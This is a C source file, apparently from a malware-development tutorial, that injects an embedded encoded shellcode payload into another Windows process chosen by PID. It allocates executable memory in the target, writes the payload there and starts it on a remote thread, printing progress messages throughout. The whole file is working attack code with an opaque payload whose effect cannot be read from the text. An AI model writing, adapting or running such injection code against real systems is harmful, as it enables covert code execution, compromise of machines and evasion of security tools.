#include <windows.h>
#include <stdio.h>

/* https://crows-nest.gitbook.io/crows-nest/malware-development/process-injection/shellcode-injection */

const char* k = "[+]";
const char* e = "[-]";
const char* i = "[*]";

int main(int argc, char* argv[]) {

    /* declare and initialize some vars for later use */
    PVOID rBuffer = NULL;
    DWORD dwPID = NULL, dwTID = NULL;
    HANDLE hProcess = NULL, hThread = NULL;

    unsigned char crowPuke[] =
    "\xbd\x71\xb6\x0d\xec\xdb\xd7\xd9\x74\x24\xf4\x58\x33\xc9"
    "\xb1\x52\x31\x68\x12\x03\x68\x12\x83\xb1\xb2\xef\x19\xcd"
    "\x53\x6d\xe1\x2d\xa4\x12\x6b\xc8\x95\x12\x0f\x99\x86\xa2"
    "\x5b\xcf\x2a\x48\x09\xfb\xb9\x3c\x86\x0c\x09\x8a\xf0\x23"
    "\x8a\xa7\xc1\x22\x08\xba\x15\x84\x31\x75\x68\xc5\x76\x68"
    "\x81\x97\x2f\xe6\x34\x07\x5b\xb2\x84\xac\x17\x52\x8d\x51"
    "\xef\x55\xbc\xc4\x7b\x0c\x1e\xe7\xa8\x24\x17\xff\xad\x01"
    "\xe1\x74\x05\xfd\xf0\x5c\x57\xfe\x5f\xa1\x57\x0d\xa1\xe6"
    "\x50\xee\xd4\x1e\xa3\x93\xee\xe5\xd9\x4f\x7a\xfd\x7a\x1b"
    "\xdc\xd9\x7b\xc8\xbb\xaa\x70\xa5\xc8\xf4\x94\x38\x1c\x8f"
    "\xa1\xb1\xa3\x5f\x20\x81\x87\x7b\x68\x51\xa9\xda\xd4\x34"
    "\xd6\x3c\xb7\xe9\x72\x37\x5a\xfd\x0e\x1a\x33\x32\x23\xa4"
    "\xc3\x5c\x34\xd7\xf1\xc3\xee\x7f\xba\x8c\x28\x78\xbd\xa6"
    "\x8d\x16\x40\x49\xee\x3f\x87\x1d\xbe\x57\x2e\x1e\x55\xa7"
    "\xcf\xcb\xfa\xf7\x7f\xa4\xba\xa7\x3f\x14\x53\xad\xcf\x4b"
    "\x43\xce\x05\xe4\xee\x35\xce\xcb\x47\xbc\x8f\xa4\x95\xbe"
    "\x8e\x8f\x13\x58\xfa\xff\x75\xf3\x93\x66\xdc\x8f\x02\x66"
    "\xca\xea\x05\xec\xf9\x0b\xcb\x05\x77\x1f\xbc\xe5\xc2\x7d"
    "\x6b\xf9\xf8\xe9\xf7\x68\x67\xe9\x7e\x91\x30\xbe\xd7\x67"
    "\x49\x2a\xca\xde\xe3\x48\x17\x86\xcc\xc8\xcc\x7b\xd2\xd1"
    "\x81\xc0\xf0\xc1\x5f\xc8\xbc\xb5\x0f\x9f\x6a\x63\xf6\x49"
    "\xdd\xdd\xa0\x26\xb7\x89\x35\x05\x08\xcf\x39\x40\xfe\x2f"
    "\x8b\x3d\x47\x50\x24\xaa\x4f\x29\x58\x4a\xaf\xe0\xd8\x6a"
    "\x52\x20\x15\x03\xcb\xa1\x94\x4e\xec\x1c\xda\x76\x6f\x94"
    "\xa3\x8c\x6f\xdd\xa6\xc9\x37\x0e\xdb\x42\xd2\x30\x48\x62"
    "\xf7";

    size_t crowPukeSize = sizeof(crowPuke);

    if (argc < 2) {
        printf("%s usage: %s <PID>", e, argv[0]);
        return EXIT_FAILURE;
    }

    dwPID = atoi(argv[1]);

    printf("%s trying to get a handle to the process (%ld)\n", i, dwPID);

    hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, dwPID); 

    if (hProcess == NULL) {
        printf("%s failed to get a handle to the process, error: 0x%lx", e, GetLastError());
        return EXIT_FAILURE;
    }

    printf("%s got a handle to the process\n\\---0x%p\n", k, hProcess);

    rBuffer = VirtualAllocEx(hProcess, NULL, crowPukeSize, (MEM_RESERVE | MEM_COMMIT), PAGE_EXECUTE_READWRITE);
    printf("%s allocated %zd-bytes to the process memory w/ PAGE_EXECUTE_READWRITE permissions\n", k, crowPukeSize);

    if (rBuffer == NULL) {
        printf("%s failed to allocate buffer, error: 0x%lx", e, GetLastError());
        return EXIT_FAILURE;
    }

    WriteProcessMemory(hProcess, rBuffer, crowPuke, crowPukeSize, NULL);
    printf("%s wrote %zd-bytes to allocated buffer\n", k, sizeof(crowPuke));

    /* create thread to run our payload */
    hThread = CreateRemoteThreadEx(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)rBuffer, NULL, 0, 0, &dwTID);
    
    if (hThread == NULL) {
        printf("%s failed to get a handle to the new thread, error: %ld", e, GetLastError());
        return EXIT_FAILURE;
    }
    
    printf("%s got a handle to the newly-created thread (%ld)\n\\---0x%p\n", k, dwTID, hProcess);

    printf("%s waiting for thread to finish executing\n", i);
    WaitForSingleObject(hThread, INFINITE);
    printf("%s thread finished executing, cleaning up\n", k);

    CloseHandle(hThread);
    CloseHandle(hProcess);
    printf("%s finished, see you next time :>", k);

    return EXIT_SUCCESS;

}